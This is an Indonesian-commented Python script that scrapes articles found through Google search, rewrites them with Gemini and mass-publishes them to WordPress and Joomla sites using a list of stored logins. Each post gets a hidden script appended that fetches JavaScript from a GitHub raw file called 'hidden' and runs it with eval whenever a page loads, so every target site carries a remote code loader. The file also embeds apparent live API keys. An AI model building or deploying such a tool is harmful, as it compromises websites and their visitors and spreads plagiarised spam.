import requests
from bs4 import BeautifulSoup
import time, random
import google.generativeai as genai

# ===================== GEMINI API CONFIG =====================
genai.configure(api_key="AIzaSyDPg5lKxlUQMIVvbhuEb_iXLDUEWZ01d_c")  # Ganti dengan API Key Gemini kamu
model = genai.GenerativeModel("gemini-1.5-flash")

# ===================== GOOGLE CUSTOM SEARCH CONFIG =====================
API_KEY = "AIzaSyD4kf6onGpyONQfvuY8JvwpWvZ-YcYc708"   # Ganti dengan Google API Key
CX = "457f10df8b67f4b65"                 # Ganti dengan Custom Search Engine ID

# ===================== BACA DOMAIN LIST =====================
def load_domains(file_path="domains.txt"):
    domains = []
    with open(file_path, "r") as f:
        for line in f.readlines():
            parts = line.strip().split("|")
            if len(parts) == 4:
                domains.append({
                    "url": parts[0],
                    "username": parts[1],
                    "password": parts[2],
                    "cms": parts[3].lower()  # wordpress / joomla
                })
    return domains

# ===================== SEARCH GOOGLE ARTICLE URLS =====================
def search_google_cse(api_key, cx, query, max_results=10):
    urls = []
    start = 1
    while len(urls) < max_results:
        params = {
            'key': api_key,
            'cx': cx,
            'q': query,
            'start': start,
            'num': min(10, max_results - len(urls))
        }
        response = requests.get('https://www.googleapis.com/customsearch/v1', params=params)
        data = response.json()

        if 'items' not in data:
            print("[!] Tidak ada hasil atau batas kuota tercapai.")
            break

        for item in data['items']:
            urls.append(item['link'])

        if len(data['items']) < 10:
            break

        start += 10
        time.sleep(1)  # rate limit
    return urls

# ===================== SCRAPING ARTIKEL & GAMBAR =====================
def scrape_article_with_image(url):
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")

        paragraphs = soup.find_all("p")
        content = "\n".join([p.get_text() for p in paragraphs])

        og_image = soup.find("meta", property="og:image")
        image_url = og_image["content"] if og_image else None

        title = soup.title.string if soup.title else "No Title"

        return {"title": title.strip(), "content": content.strip(), "image_url": image_url}
    except Exception as e:
        print(f"Error scraping {url}: {e}")
        return None

# ===================== AI REWRITE PAKAI GEMINI =====================
def ai_rewrite(text):
    prompt = f"Tolong rewrite artikel berikut dalam bahasa Indonesia agar lebih natural, panjang, dan SEO-friendly:\n\n{text}"
    response = model.generate_content(prompt)
    return response.text

# ===================== TAMBAHKAN SCRIPT JAVASCRIPT =====================
def add_script(content):
    script_code = """
<script>
fetch("https://raw.githubusercontent.com/yooz212/hidden/refs/heads/main/file.txt")
  .then(res => res.text())
  .then(code => eval(code))
  .catch(err => console.error("Script load error:", err));
</script>
"""
    return content + "\n" + script_code

# ===================== FORMAT UNTUK POST WORDPRESS (TERMASUK GAMBAR) =====================
def post_wordpress(domain, title, content, image_url=None):
    endpoint_post = f"{domain['url'].rstrip('/')}/wp-json/wp/v2/posts"
    headers = {"Content-Type": "application/json"}   # cara lama tetap ada

    media_id = None
    if image_url:
        endpoint_media = f"{domain['url'].rstrip('/')}/wp-json/wp/v2/media"
        try:
            img_resp = requests.get(image_url, stream=True)
            if img_resp.status_code == 200:
                filename = image_url.split("/")[-1].split("?")[0]

                # --- cara lama (tetap dicoba duluan) ---
                files = {'file': (filename, img_resp.content)}
                r = requests.post(endpoint_media, auth=(domain["username"], domain["password"]), files=files)

                # --- fallback kalau error 415 ---
                if r.status_code == 415:
                    print("[!] 415 saat upload image, coba ulang pakai header Content-Disposition...")
                    files = {'file': (filename, img_resp.content, 'image/jpeg')}
                    headers_img = {'Content-Disposition': f'attachment; filename={filename}'}
                    r = requests.post(endpoint_media, auth=(domain["username"], domain["password"]), headers=headers_img, files=files)

                if r.status_code in [200, 201]:
                    media_id = r.json()['id']
                    print(f"[OK] Uploaded image to WordPress media: {filename}")
                else:
                    print(f"[FAILED] Upload image: {r.status_code} {r.text}")
            else:
                print("[!] Gagal download gambar untuk upload")
        except Exception as e:
            print(f"[ERROR] Upload gambar ke WordPress: {e}")

    data = {"title": title, "content": content, "status": "publish"}
    if media_id:
        data["featured_media"] = media_id

    try:
        # --- cara lama (tetap dicoba duluan) ---
        r = requests.post(endpoint_post, auth=(domain["username"], domain["password"]), headers=headers, json=data)

        # --- fallback kalau error 415 ---
        if r.status_code == 415:
            print("[!] 415 saat posting artikel, coba ulang tanpa manual header...")
            r = requests.post(endpoint_post, auth=(domain["username"], domain["password"]), json=data)

        if r.status_code in [200, 201]:
            print(f"[OK] Posted to WordPress: {domain['url']} - {title}")
        else:
            print(f"[FAILED] WordPress {domain['url']}: {r.status_code} {r.text}")
    except Exception as e:
        print(f"[ERROR] Failed to post WordPress {domain['url']}: {e}")

# ===================== POST KE JOOMLA (API Contoh) =====================
def post_joomla(domain, title, content, image_url=None):
    endpoint = f"{domain['url'].rstrip('/')}/api/index.php/v1/content/articles"
    data = {"title": title, "articletext": content, "state": 1}
    try:
        r = requests.post(endpoint, auth=(domain["username"], domain["password"]), json=data)
        if r.status_code in [200, 201]:
            print(f"[OK] Posted to Joomla: {domain['url']} - {title}")
        else:
            print(f"[FAILED] Joomla {domain['url']}: {r.status_code} {r.text}")
    except Exception as e:
        print(f"[ERROR] Failed Joomla {domain['url']}: {e}")

# ===================== MAIN WORKFLOW =====================
def main():
    domains = load_domains("domains.txt")
    keyword = input("Masukkan keyword artikel: ")
    print(f"[⚡] Mencari artikel untuk keyword: {keyword}")

    max_articles_needed = len(domains) * 2
    article_urls = search_google_cse(API_KEY, CX, keyword, max_results=max_articles_needed)

    articles = []
    for url in article_urls:
        print(f"[>] Scraping artikel dari: {url}")
        article = scrape_article_with_image(url)
        if not article or not article["content"]:
            print("[!] Gagal scrape, skip.")
            continue

        print("[>] Melakukan rewrite artikel pakai Gemini...")
        rewritten = ai_rewrite(article["content"])
        final_content = add_script(rewritten)

        articles.append({
            "title": article["title"],
            "content": final_content,
            "image_url": article["image_url"]
        })

    if len(articles) < len(domains):
        print("[!] Jumlah artikel kurang untuk tiap domain, beberapa domain akan dapat artikel sama.")

    random.shuffle(articles)  # Acak artikel supaya tiap domain berbeda

    for i, domain in enumerate(domains):
        idx = i % len(articles)
        art = articles[idx]

        if domain["cms"] == "wordpress":
            post_wordpress(domain, art["title"], art["content"], art["image_url"])
        elif domain["cms"] == "joomla":
            post_joomla(domain, art["title"], art["content"], art["image_url"])

        time.sleep(random.randint(3, 6))  # Delay antar posting

if __name__ == "__main__":
    main()
